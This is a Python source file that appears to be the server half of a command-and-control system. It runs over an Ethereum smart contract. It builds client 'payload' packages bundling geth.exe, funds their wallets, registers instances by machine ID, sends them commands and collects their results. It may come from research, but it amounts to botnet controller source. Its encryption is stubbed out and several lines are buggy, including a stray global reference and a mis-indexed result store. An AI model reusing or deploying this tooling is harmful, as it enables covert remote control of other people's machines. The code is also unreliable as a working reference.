import yaml, os, sys, glob
from os.path import join as opj
from web3 import Web3, HTTPProvider
from web3.contract import ConciseContract
from Util.EtherKeysUtil import unlockAccount, generatePassword, generateWallet, loadWallet
from Util.LogWrapper import LogWrapper
from shutil import copyfile,copy
from Util.EtherTransaction import *

l = LogWrapper.getLogger()



REGISTRATION_REQUEST_EVENT_NAME = 'RegistrationRequest'
COMMAND_RESULT_EVENT_NAME = 'CommandResult'


class ServerCommands:

    def __init__(self, confFile):
        with open(confFile) as f:
            conf = yaml.safe_load(f)

        self.contractAddress = conf['contract']['address']
        self.contractAbi = conf['contract']['abi']

        l.debug ("connecting to local node", conf['nodeRpcUrl'])
        self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))

        # load CnC contract
        self.contract = self.loadContract()
        #TODO: check contract is up, otherwise go to sleep or die

        self.ownerAddress = conf['ownerAddress']
        self.ownerPassword = conf['ownerWalletPassword']
        self.keyGenScript = conf['keyGenScript']
        l.info("contract owner wallet address:",self.ownerAddress)
        unlockAccount(self.ownerAddress, self.ownerPassword, self.web3)



        self.instances = dict()

        self.cmdId = 0


    def loadContract(self):

        l.info('loading contract from:', self.contractAddress, self.contractAbi)

        contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
        return contract



    '''
        
        :param fundValue: amount in wei to transfer to the client 
        :param clientConfTemplateFile: 
        :param clientId: 
        :param rpcPort: 
        :param walletJson: 
        :param walletPassword: 
        :return: 
    '''
    def generateNewClientInstance (self, fundValue, clientConfTemplateFile, clientId = '', rpcPort = 8595, port=30303, walletJson = None, walletPassword = None):
        with open(clientConfTemplateFile) as f:
            clientConfTemplate = yaml.safe_load(f)

        l.info ("Creating new Client instance")
        walletPassword = generatePassword(20) if walletPassword == None else walletPassword

        if not walletJson:
            l.info("Generating a new account")
            walletJson, public, private, address = generateWallet(
                self.keyGenScript, walletPassword)
        else:
            l.info("Loading existing wallet...")
            public, private, address = loadWallet(walletJson, walletPassword)

        l.info('Client Account Details:')
        l.info('\tPublic key:', public)
        l.info('\tAddress:', address)
        l.debug('\tPrivate key:', private)

        #Generate Conf
        clientConfTemplate['nodeRpcUrl'] = clientConfTemplate['nodeRpcUrl'].replace('%NODEPORT%', str(rpcPort))
        clientConfTemplate['BlockChainData'] = clientConfTemplate['BlockChainData'].replace('%CLIENT_ID%', clientId)
        clientConfTemplate['gethCmd'] = ' '.join(clientConfTemplate['gethCmd']) \
            .replace('%RPCPORT%', str(rpcPort)) \
            .replace('%NODEPORT%', str(port)) \
            .replace('%DATADIR%', clientConfTemplate['BlockChainData']) \
            .split(' ')
        clientConfTemplate['clientWallet'] = walletJson
        clientConfTemplate['clientWalletPassword'] = walletPassword

        # Package the Code
        #TODO add all components
        generatedDir = opj('generated',address)
        l.info('writing client payload into',generatedDir)
        os.makedirs(opj(generatedDir, 'src', 'Client'), exist_ok=True)
        for file in glob.glob(opj('src', 'Client', '*.py')):
            copy(file, opj(generatedDir, 'src', 'Client'))

        os.makedirs(opj(generatedDir, 'src', 'Util'), exist_ok=True)
        for file in glob.glob(opj('src', 'Util', '*.py')):
            copy(file, opj(generatedDir, 'src', 'Util'))

        os.makedirs(opj(generatedDir, 'bin'), exist_ok=True)
        copy(opj('bin','geth.exe'),opj(generatedDir, 'bin'))
        copy(opj('bin', 'genpriv.sh'), opj(generatedDir, 'bin'))

        os.makedirs(opj(generatedDir,'conf'), exist_ok=True)
        with open(opj(generatedDir, 'conf', 'clientConf.yaml'), 'w') as f:
            yaml.safe_dump(clientConfTemplate, f)

        os.makedirs(opj(generatedDir, 'src', 'build'), exist_ok=True)
        os.makedirs(opj(generatedDir, 'src', 'logs'), exist_ok=True)

        l.info ("Sending ",self.web3.fromWei(fundValue,"ether"),"ether to client wallet")
        sc.web3.eth.sendTransaction({'from': sc.ownerAddress, 'to': address,
                                     'value': fundValue, 'gas': 21000})

        tx_hash = self.contract.allowInstance(address, transact={'from': self.ownerAddress})
        l.debug('Call allowInstance on contract',self.contractAddress, 'tx_hash:',tx_hash)

        #TODO:Split the balance to a small amount up first in sendTransaction and add most of the funds in allowInstance, that way it will only be transfered if instance successfully registered.

        self.instances[address] = dict()
        self.instances[address]['public'] = public


        return clientConfTemplate

    def decryptMessage(self, msg, decrypt=True):
        if decrypt:
            pass
        # 	alice = pyelliptic.ecc()
        # 	msg = alice.encrypt(msg,self.ownerPubKey)
        return msg

    def encryptMessage(self, instanceAddress, msg, encrypt=True):
        public = self.instances[instanceAddress]['public']
        if encrypt:
            pass
        # 	bob = pyelliptic.ecc()
        # 	bob.decrypt()
        return msg

    def addWork (self, instanceAddress, command):
        if instanceAddress in self.instances:
            commandEnc = self.encryptMessage(instanceAddress,command)
            instanceHash = self.web3.sha3(instanceAddress)
            l.info("Command",self.cmdId," was sent to",instanceAddress)
            self.contract.addWork(instanceHash, commandEnc, self.cmdId, transact={'from': self.ownerAddress, 'gas': 3000000})
            self.instances[instanceAddress]['commands'] = dict()
            self.instances[instanceAddress]['commands'][self.cmdId] = [command, None]
            self.cmdId += 1
            return True
        return False

    def removeInstance (self, instanceAddress):
        if instanceAddress in self.instances:
            instanceHash = self.web3.sha3(instanceAddress)
            l.info("disallowing ",instanceAddress)
            self.contract.removeInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': 3000000})
            return True
        return False

    def allowInstance (self, instanceAddress):
        if instanceAddress in self.instances:
            instanceHash = self.web3.sha3(instanceAddress)
            l.info("allowing ",instanceAddress)
            self.contract.allowInstance(instanceHash, transact={'from': self.ownerAddress, 'gas': 3000000})
            return True
        return False


    def registrationConfirmation (self, instanceAddress, sessionId):
        if instanceAddress in self.instances:
            instanceHash = self.web3.sha3(instanceAddress)
            sessionId = self.encryptMessage(instanceAddress, sessionId)
            l.info("sending successful registration confirmation to",instanceAddress)
            self.contract.allowInstance(instanceHash,sessionId, transact={'from': self.ownerAddress, 'gas': 3000000})
            return True
        return False



    def startInstanceRegistrationRequestWatcher(self):
            try:
                l.info('Starting to watch for new instance registrations...')
                self.regRequestFilter, eventABI = createLogEventFilter(REGISTRATION_REQUEST_EVENT_NAME,
                                                                    self.contractAbi,
                                                                    self.contractAddress,
                                                                    self.web3,
                                                                    topicFilters=[])

                def onCommandArrival(tx):
                    l.debug('new registration request:', tx)

                    machineIdHash = getLogEventArg(tx, eventABI, 'machineIdHash')
                    instanceAddress = getFrom(tx)
                    if instanceAddress in self.instances:
                        l.info('got new registration Request from:', instanceAddress, 'on machine:', machineIdHash)
                        #Contract has already validated that the instance is new and was not registered before
                        #all we have to do is to generate the instanceId for it.
                        sessionId = self.web3.sha3 (machineIdHash,instanceAddress,generatePassword()) #machineId+address+Random

                        sessionAndMachineIdHash = self.web3.sha3(sessionId, machineIdHash)

                        self.registrationConfirmation(instanceAddress,sessionId)

                        l.debug('saving sessionAndMachineIdHash for',instanceAddress,":", sessionAndMachineIdHash)
                        self.instances[instanceAddress].sessionAndMachineIdHash = sessionAndMachineIdHash
                    else:
                        raise ValueError('Some tried to register an instance',instanceAddress,' that is not in local instance cache. This can be cause contract and server are out of sync')
                self.regRequestFilter.watch(onCommandArrival)
            except Exception as e:
                l.error("Error in Instance Registraton event watcher operation:", e)
                if self.regRequestFilter and self.regRequestFilter.running:
                    self.regRequestFilter.stopWatching()

    def startCommandResultWatcher(self):
            try:
                l.info('Starting to watch for command results from instances...')
                self.cmdResultFilter, eventABI = createLogEventFilter(COMMAND_RESULT_EVENT_NAME,
                                                                    self.contractAbi,
                                                                    self.contractAddress,
                                                                    self.web3,
                                                                    topicFilters=[])

                def onCommandArrival(tx):
                    l.debug('new Command result:', tx)

                    sessionAndMachineIdHash = getLogEventArg(tx, eventABI, 'sessionAndMachineIdHash')
                    commandResult = getLogEventArg(tx, eventABI, 'commandResult')
                    commandResultDec = self.decryptMessage(commandResult)
                    cmdId = getLogEventArg(tx, eventABI, 'cmdId')
                    instanceAddress = getFrom(tx)

                    if instanceAddress in self.instances:
                        l.info('got new Commandresult for cmdId:',cmdId,"from:", instanceAddress, 'sessionAndMachineIdHash:', sessionAndMachineIdHash)
                        if sessionAndMachineIdHash == self.instances[instanceAddress]['sessionAndMachineIdHash']:
                            self.instances[instanceAddress]['commands'][self.cmdId][1] = commandResult
                            l.info ('Confirmed match between instance issued command and result:',self.instances[instanceAddress]['commands'][self.cmdId])
                        else:
                            l.error("Mismatch between saved session id and given by client! Client is invalid, recommend to remove!")
                            l.error("given id:",sessionAndMachineIdHash,'saved:',self.instances[instanceAddress]['sessionAndMachineIdHash'])
                    else:
                        raise ValueError('got result from instance',instanceAddress,' that is not in local instance cache. This can be cause contract and server are out of sync')
                self.cmdResultFilter.watch(onCommandArrival)
            except Exception as e:
                l.error("Error in Command Result event watcher operation:", e)
                if self.cmdResultFilter and self.cmdResultFilter.running:
                    self.cmdResultFilter.stopWatching()

    def startAllWatchers(self):
        self.startInstanceRegistrationRequestWatcher()
        self.startCommandResultWatcher()

    def stopAllWatchers(self):
        self.cmdResultFilter.stopWatching()
        self.regRequestFilter.stopWatching()


if __name__ == "__main__":

    l.info("base dir ", sys.argv[1])
    os.chdir(sys.argv[1])

    sc = ServerCommands(opj('conf','gen', 'ServerConf.yaml'))

    clientConfTemplate = sc.generateNewClientInstance(1000000000000000000,opj('conf','gen', 'ClientConf.TEMPLATE.yaml'), port=30304)

    sc.startAllWatchers()


